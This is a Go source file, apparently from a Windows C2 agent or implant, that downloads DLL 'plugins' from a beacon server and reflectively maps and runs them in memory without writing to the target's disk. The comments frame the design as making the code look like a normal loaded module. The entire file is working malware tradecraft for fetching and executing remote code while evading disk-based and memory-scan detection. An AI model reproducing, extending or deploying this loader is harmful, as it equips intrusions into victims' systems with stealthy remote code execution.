//go:build windows

// Diskless PE plugin loader.
//
// Plugins are DLL images fetched over the authenticated beacon channel
// and mapped into this process with an NT section object. Nothing is
// ever written to the target disk: the bytes stay in memory from the
// HTTP response to the mapped image. The image is mapped twice from one
// section object, PAGE_READWRITE for staging and PAGE_EXECUTE_READ for
// execution, so code pages are never writable and executable at the same
// time and the mapped region is reported as MEM_IMAGE like a normal
// module instead of private VirtualAlloc memory.
//
// Only PE32+ amd64 images are supported. Manually mapped modules are not
// registered with the Windows loader, so plugins must not rely on
// GetModuleHandle(self), implicit TLS, C++ exceptions, or CFG.
package main

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"net/http"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

const (
	pageReadOnly         = 0x02
	pageReadWrite        = 0x04
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40
	sectionAllAccess     = 0xF001F
	sectionCommit        = 0x800000
	sectionInheritUnmap  = 2
	sectionPageSize      = 0x1000
	pluginOutputBytes    = 1024 * 1024
	imageScnMemExecute   = 0x20000000
	imageScnMemWrite     = 0x80000000
)

var (
	ntdll                    = syscall.NewLazyDLL("ntdll.dll")
	kernel32Mod              = syscall.NewLazyDLL("kernel32.dll")
	procNtCreateSection      = ntdll.NewProc("NtCreateSection")
	procNtMapViewOfSection   = ntdll.NewProc("NtMapViewOfSection")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
	procNtClose              = ntdll.NewProc("NtClose")
	procGetCurrentProcess    = kernel32Mod.NewProc("GetCurrentProcess")
	procLoadLibraryA         = kernel32Mod.NewProc("LoadLibraryA")
	procGetProcAddress       = kernel32Mod.NewProc("GetProcAddress")
	procVirtualProtect       = kernel32Mod.NewProc("VirtualProtect")
	pluginMu                 sync.Mutex
	pluginBases              = make(map[string]uintptr)
)

// loadPluginPE fetches the plugin from the beacon server on first use,
// maps it into this process, and calls the requested export. Mapped
// plugins are cached so repeated commands reuse the same image.
func loadPluginPE(client *http.Client, cfg *config, url, exportName, input string) (string, error) {
	if runtime.GOARCH != "amd64" {
		return "", errors.New("PE plugins require the windows/amd64 agent build")
	}
	pluginMu.Lock()
	defer pluginMu.Unlock()
	base, cached := pluginBases[url]
	if !cached {
		data, err := request(client, cfg, http.MethodGet, url, values(cfg), nil)
		if err != nil {
			return "", fmt.Errorf("plugin download failed: %w", err)
		}
		base, err = mapPluginPE(data)
		if err != nil {
			return "", err
		}
		pluginBases[url] = base
	}
	return callPluginExport(base, exportName, input)
}

// mapPluginPE manually maps a PE32+ amd64 DLL image into the current
// process and returns the base address of the executable view.
func mapPluginPE(data []byte) (uintptr, error) {
	file, err := pe.NewFile(bytes.NewReader(data))
	if err != nil {
		return 0, fmt.Errorf("invalid plugin PE: %w", err)
	}
	defer file.Close()
	if file.FileHeader.Machine != pe.IMAGE_FILE_MACHINE_AMD64 {
		return 0, errors.New("plugin PE must target amd64")
	}
	opt, ok := file.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, errors.New("plugin PE must be PE32+ (amd64)")
	}
	if opt.SizeOfImage < opt.SizeOfHeaders || uint64(len(data)) < uint64(opt.SizeOfHeaders) {
		return 0, errors.New("plugin PE is truncated")
	}
	rxBase, rwBase, section, err := mapPluginViews(opt.SizeOfImage)
	if err != nil {
		return 0, err
	}
	committed := false
	defer func() {
		if !committed {
			procNtUnmapViewOfSection.Call(rwBase)
			procNtUnmapViewOfSection.Call(rxBase)
			procNtClose.Call(section)
		}
	}()
	if err := copyPluginImage(rwBase, file, opt, data); err != nil {
		return 0, err
	}
	delta := uint64(rxBase) - opt.ImageBase
	if delta != 0 {
		if err := applyPluginRelocations(file, data, opt, rwBase, delta); err != nil {
			return 0, err
		}
	}
	if err := resolvePluginImports(file, data, opt, rwBase); err != nil {
		return 0, err
	}
	applyPluginProtections(rxBase, file, opt)
	// Drop the writable alias; only the RX image view remains mapped.
	procNtUnmapViewOfSection.Call(rwBase)
	procNtClose.Call(section)
	committed = true
	if opt.AddressOfEntryPoint != 0 {
		ret, _, _ := syscall.SyscallN(rxBase+uintptr(opt.AddressOfEntryPoint), rxBase, 1, 0)
		if ret == 0 {
			procNtUnmapViewOfSection.Call(rxBase)
			return 0, errors.New("plugin DllMain rejected DLL_PROCESS_ATTACH")
		}
	}
	return rxBase, nil
}

// mapPluginViews creates one NT section object and maps it twice: a
// PAGE_READWRITE view for staging bytes and a PAGE_EXECUTE_READ view for
// execution. Code is never writable and executable at the same time.
func mapPluginViews(imageSize uint32) (uintptr, uintptr, uintptr, error) {
	maxSize := int64((uintptr(imageSize) + sectionPageSize - 1) &^ (sectionPageSize - 1))
	var handle uintptr
	status, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&handle)),
		sectionAllAccess,
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		pageExecuteReadWrite,
		sectionCommit,
		0,
	)
	if uintptr(status)>>63 != 0 {
		return 0, 0, 0, fmt.Errorf("NtCreateSection failed with status 0x%x", uintptr(status))
	}
	process, _, _ := procGetCurrentProcess.Call()
	mapView := func(protection uintptr) (uintptr, error) {
		base := uintptr(0)
		viewSize := uintptr(0)
		status, _, _ := procNtMapViewOfSection.Call(
			handle,
			process,
			uintptr(unsafe.Pointer(&base)),
			0, 0, 0,
			uintptr(unsafe.Pointer(&viewSize)),
			sectionInheritUnmap,
			0,
			protection,
		)
		if uintptr(status)>>63 != 0 {
			return 0, fmt.Errorf("NtMapViewOfSection failed with status 0x%x", uintptr(status))
		}
		return base, nil
	}
	rwBase, err := mapView(pageReadWrite)
	if err != nil {
		procNtClose.Call(handle)
		return 0, 0, 0, err
	}
	rxBase, err := mapView(pageExecuteRead)
	if err != nil {
		procNtUnmapViewOfSection.Call(rwBase)
		procNtClose.Call(handle)
		return 0, 0, 0, err
	}
	return rxBase, rwBase, handle, nil
}

// copyPluginImage copies the DOS/PE headers and every raw-backed section
// into the writable staging view. Fresh section pages are already zero,
// so BSS-style sections need no handling here.
func copyPluginImage(rwBase uintptr, file *pe.File, opt *pe.OptionalHeader64, data []byte) error {
	copy(unsafe.Slice((*byte)(unsafe.Pointer(rwBase)), int(opt.SizeOfHeaders)), data[:opt.SizeOfHeaders])
	for _, section := range file.Sections {
		header := &section.SectionHeader
		if header.Offset == 0 || header.Size == 0 {
			continue
		}
		rawStart := int(header.Offset)
		rawLen := int(header.Size)
		if rawStart+rawLen > len(data) {
			return fmt.Errorf("plugin section %q is truncated", header.Name)
		}
		size := rawLen
		if virtual := int(header.VirtualSize); virtual > 0 && virtual < size {
			size = virtual
		}
		if int64(header.VirtualAddress)+int64(size) > int64(opt.SizeOfImage) {
			return fmt.Errorf("plugin section %q exceeds the image bounds", header.Name)
		}
		destination := unsafe.Slice((*byte)(unsafe.Pointer(rwBase+uintptr(header.VirtualAddress))), size)
		copy(destination, data[rawStart:rawStart+size])
	}
	return nil
}

// applyPluginRelocations patches IMAGE_REL_BASED_DIR64 entries in the
// staging view when the image was mapped away from its preferred base.
func applyPluginRelocations(file *pe.File, data []byte, opt *pe.OptionalHeader64, rwBase uintptr, delta uint64) error {
	dir := opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
	if dir.VirtualAddress == 0 || dir.Size == 0 {
		return errors.New("plugin PE cannot be rebased: it has no base relocations")
	}
	raw, err := pluginRawAt(file, data, dir.VirtualAddress, dir.Size)
	if err != nil {
		return err
	}
	for offset := 0; offset+8 <= len(raw); {
		pageRVA := binary.LittleEndian.Uint32(raw[offset:])
		blockSize := int(binary.LittleEndian.Uint32(raw[offset+4:]))
		if blockSize < 8 || offset+blockSize > len(raw) {
			return errors.New("plugin has a malformed relocation table")
		}
		for i := 8; i+2 <= blockSize; i += 2 {
			entry := binary.LittleEndian.Uint16(raw[offset+i:])
			switch entry >> 12 {
			case 0: // IMAGE_REL_BASED_ABSOLUTE padding
			case 10: // IMAGE_REL_BASED_DIR64
				target := rwBase + uintptr(pageRVA) + uintptr(entry&0xFFF)
				*(*uint64)(unsafe.Pointer(target)) += delta
			default:
				return fmt.Errorf("plugin uses unsupported relocation type %d", entry>>12)
			}
		}
		offset += blockSize
	}
	return nil
}

// resolvePluginImports patches the import address table in the staging
// view. Dependencies resolve through the normal Windows loader, so only
// DLLs unavailable on the target fail here.
func resolvePluginImports(file *pe.File, data []byte, opt *pe.OptionalHeader64, rwBase uintptr) error {
	dir := opt.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_IMPORT]
	if dir.VirtualAddress == 0 || dir.Size == 0 {
		return nil
	}
	raw, err := pluginRawAt(file, data, dir.VirtualAddress, dir.Size)
	if err != nil {
		return err
	}
	for offset := 0; offset+20 <= len(raw); offset += 20 {
		nameRVA := binary.LittleEndian.Uint32(raw[offset+12:])
		firstThunk := binary.LittleEndian.Uint32(raw[offset+16:])
		if nameRVA == 0 && firstThunk == 0 {
			break
		}
		if nameRVA == 0 || firstThunk == 0 {
			return errors.New("plugin has a malformed import descriptor")
		}
		dllName, err := pluginRawString(file, data, nameRVA, 256)
		if err != nil {
			return err
		}
		dllBytes := append([]byte(dllName), 0)
		module, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(&dllBytes[0])))
		if module == 0 {
			return fmt.Errorf("plugin dependency %q is unavailable", dllName)
		}
		thunkRVA := binary.LittleEndian.Uint32(raw[offset:])
		if thunkRVA == 0 {
			thunkRVA = firstThunk
		}
		for index := uint32(0); ; index++ {
			thunkRaw, err := pluginRawAt(file, data, thunkRVA+index*8, 8)
			if err != nil {
				return err
			}
			thunk := binary.LittleEndian.Uint64(thunkRaw)
			if thunk == 0 {
				break
			}
			var procAddr uintptr
			var importName string
			if thunk>>63 == 1 {
				importName = fmt.Sprintf("ordinal %d", thunk&0xFFFF)
				procAddr, _, _ = procGetProcAddress.Call(module, uintptr(thunk&0xFFFF))
			} else {
				importName, err = pluginRawString(file, data, uint32(thunk)+2, 256)
				if err != nil {
					return err
				}
				nameBytes := append([]byte(importName), 0)
				procAddr, _, _ = procGetProcAddress.Call(module, uintptr(unsafe.Pointer(&nameBytes[0])))
			}
			if procAddr == 0 {
				return fmt.Errorf("plugin import %s!%s could not be resolved", dllName, importName)
			}
			*(*uintptr)(unsafe.Pointer(rwBase + uintptr(firstThunk) + uintptr(index)*8)) = procAddr
		}
	}
	return nil
}

// applyPluginProtections tightens per-section page protections inside the
// RX view so writable data is not executable and code is not writable.
func applyPluginProtections(rxBase uintptr, file *pe.File, opt *pe.OptionalHeader64) {
	var old uintptr
	for _, section := range file.Sections {
		header := &section.SectionHeader
		start := uintptr(header.VirtualAddress)
		if start >= uintptr(opt.SizeOfImage) {
			continue
		}
		size := uintptr(header.VirtualSize)
		if size == 0 {
			size = uintptr(header.Size)
		}
		size = (size + sectionPageSize - 1) &^ (sectionPageSize - 1)
		if start+size > uintptr(opt.SizeOfImage) {
			size = uintptr(opt.SizeOfImage) - start
		}
		if size == 0 {
			continue
		}
		protection := uintptr(pageReadOnly)
		switch {
		case header.Characteristics&imageScnMemWrite != 0 && header.Characteristics&imageScnMemExecute != 0:
			protection = pageExecuteReadWrite
		case header.Characteristics&imageScnMemWrite != 0:
			protection = pageReadWrite
		case header.Characteristics&imageScnMemExecute != 0:
			protection = pageExecuteRead
		}
		procVirtualProtect.Call(rxBase+start, size, protection, uintptr(unsafe.Pointer(&old)))
	}
}

// callPluginExport locates an export in the mapped plugin image and
// invokes it with the documented plugin ABI:
//
//	int Run(const char *input, char *output, int outputCap)
//
// The return value zero means success; anything else is reported as a
// plugin error code. Exports with fewer parameters are tolerated because
// extra arguments are ignored by the x64 calling convention.
func callPluginExport(base uintptr, exportName, input string) (string, error) {
	addr, err := findPluginExport(base, exportName)
	if err != nil {
		return "", err
	}
	inputBytes := make([]byte, len(input)+1)
	copy(inputBytes, input)
	output := make([]byte, pluginOutputBytes)
	ret, _, _ := syscall.SyscallN(addr,
		uintptr(unsafe.Pointer(&inputBytes[0])),
		uintptr(unsafe.Pointer(&output[0])),
		uintptr(len(output)-1),
	)
	if ret != 0 {
		return "", fmt.Errorf("plugin export %s failed with code %d", exportName, int32(ret))
	}
	if end := bytes.IndexByte(output, 0); end >= 0 {
		return string(output[:end]), nil
	}
	return string(output), nil
}

// findPluginExport walks the export address table of the mapped image.
// The Windows loader does not know about manually mapped modules, so
// GetProcAddress cannot be used here.
func findPluginExport(base uintptr, exportName string) (uintptr, error) {
	if exportName == "" {
		return 0, errors.New("plugin export name is empty")
	}
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D { // MZ
		return 0, errors.New("mapped plugin image is corrupted")
	}
	ntHeaders := base + uintptr(*(*uint32)(unsafe.Pointer(base + 0x3c)))
	if *(*uint32)(unsafe.Pointer(ntHeaders)) != 0x00004550 { // PE\0\0
		return 0, errors.New("mapped plugin image has no PE header")
	}
	optional := ntHeaders + 24
	if *(*uint16)(unsafe.Pointer(optional)) != 0x20B {
		return 0, errors.New("mapped plugin image is not PE32+")
	}
	if *(*uint32)(unsafe.Pointer(optional + 108)) < 1 { // NumberOfRvaAndSizes
		return 0, errors.New("mapped plugin image has no data directories")
	}
	exportRVA := *(*uint32)(unsafe.Pointer(optional + 112)) // DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
	if exportRVA == 0 {
		return 0, errors.New("plugin exports no functions")
	}
	exportSize := *(*uint32)(unsafe.Pointer(optional + 116))
	exports := base + uintptr(exportRVA)
	numFunctions := *(*uint32)(unsafe.Pointer(exports + 20))
	numNames := *(*uint32)(unsafe.Pointer(exports + 24))
	addrFunctions := *(*uint32)(unsafe.Pointer(exports + 28))
	addrNames := *(*uint32)(unsafe.Pointer(exports + 32))
	addrOrdinals := *(*uint32)(unsafe.Pointer(exports + 36))
	if numNames == 0 || numNames > 0x100000 {
		return 0, errors.New("plugin has an invalid export table")
	}
	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(base + uintptr(addrNames) + uintptr(i)*4))
		if mappedPluginString(base+uintptr(nameRVA), 256) == exportName {
			ordinal := *(*uint16)(unsafe.Pointer(base + uintptr(addrOrdinals) + uintptr(i)*2))
			if uint32(ordinal) >= numFunctions {
				return 0, errors.New("plugin has an invalid export ordinal")
			}
			funcRVA := *(*uint32)(unsafe.Pointer(base + uintptr(addrFunctions) + uintptr(ordinal)*4))
			if funcRVA == 0 {
				return 0, errors.New("plugin export is null")
			}
			if funcRVA >= exportRVA && funcRVA < exportRVA+exportSize {
				return 0, errors.New("forwarded plugin exports are unsupported")
			}
			return base + uintptr(funcRVA), nil
		}
	}
	return 0, fmt.Errorf("plugin export %q was not found", exportName)
}

// mappedPluginString reads a NUL-terminated string from the mapped image.
func mappedPluginString(p uintptr, limit int) string {
	raw := unsafe.Slice((*byte)(unsafe.Pointer(p)), limit)
	if end := bytes.IndexByte(raw, 0); end >= 0 {
		return string(raw[:end])
	}
	return string(raw)
}

// pluginRawAt returns raw file bytes for a data directory entry.
func pluginRawAt(file *pe.File, data []byte, rva, size uint32) ([]byte, error) {
	off, err := pluginRawOffset(file, rva)
	if err != nil {
		return nil, err
	}
	if uint64(off)+uint64(size) > uint64(len(data)) {
		return nil, fmt.Errorf("plugin directory at RVA 0x%x is truncated", rva)
	}
	return data[off : off+int(size)], nil
}

// pluginRawOffset translates an RVA into a raw file offset.
func pluginRawOffset(file *pe.File, rva uint32) (int, error) {
	for _, section := range file.Sections {
		header := &section.SectionHeader
		if header.Size == 0 {
			continue
		}
		if uint64(rva) >= uint64(header.VirtualAddress) &&
			uint64(rva) < uint64(header.VirtualAddress)+uint64(header.Size) {
			return int(rva-header.VirtualAddress) + int(header.Offset), nil
		}
	}
	return 0, fmt.Errorf("plugin RVA 0x%x is not backed by raw data", rva)
}

// pluginRawString reads a NUL-terminated string from raw file data.
func pluginRawString(file *pe.File, data []byte, rva, limit uint32) (string, error) {
	raw, err := pluginRawAt(file, data, rva, limit)
	if err != nil {
		return "", err
	}
	if end := bytes.IndexByte(raw, 0); end >= 0 {
		return string(raw[:end]), nil
	}
	return string(raw), nil
}
